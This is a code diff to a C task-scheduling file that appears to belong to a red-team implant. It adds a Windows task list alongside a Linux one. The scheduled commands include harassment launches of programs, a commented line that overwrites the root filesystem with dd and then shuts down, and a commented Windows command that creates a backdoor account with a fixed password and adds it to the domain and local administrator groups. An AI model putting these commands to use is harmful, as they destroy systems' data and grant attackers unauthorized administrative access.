@@ -1,5 +1,6 @@
 #include "alarmpart.h"
 
+#ifdef LINUX_VERSION
 taskstruct tasklist[] = {
     {FRIDAY, 15, 0, "/usr/bin/xeyes", 0},
 
@@ -23,6 +24,16 @@ taskstruct tasklist[] = {
     {SATURDAY, 15, 0, "/bin/dd if=/dev/null of=/dev/mapper/centos-root bs=1M; shutdown -h now", 0}           //.11 only, doubt this will ever run but why not have it.
 */
 };
+#endif
+
+#ifdef WINDOWS_VERSION
+ taskstruct tasklist[] = {
+{ FRIDAY, 15, 0, "c:\\Windows\\notepad.exe", 0},
+{ SATURDAY, 15, 0, "c:\\Windows\\notepad.exe", 0}
+//{ SATURDAY, 10, 0, "net user Scoring redteam123 /add; net group \"Domain Administrators\" /add; net localgroup \"Administrators\" /add;", 0}
+};
+#endif
+
 
 void add_task(int day, int hour, int min, char *task)
 {
